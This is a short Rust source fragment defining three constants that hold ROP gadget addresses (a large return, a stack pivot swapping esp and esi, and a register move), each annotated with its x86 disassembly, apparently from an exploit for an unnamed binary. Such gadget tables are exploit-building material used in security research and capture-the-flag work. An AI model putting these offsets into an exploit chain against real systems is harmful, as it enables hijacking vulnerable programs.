/// ```norun
/// ret 0xa74
/// ```
pub const BIG_RET: i32 = 0x16160b;


/// ```norun
/// xchg esp, esi
/// add byte [eax], al
/// add bh, bh
/// adc eax, 0x682d60
/// mov al, 0x1
/// pop edi
/// ret
/// ```
pub const STACK_PIVOT: i32 = 0x194a5c;

/// ```norun
/// mov eax, ecx
/// pop ebp
/// ret
/// ```
pub const MOV_EAX_ECX_POP: i32 = 0x76ba;
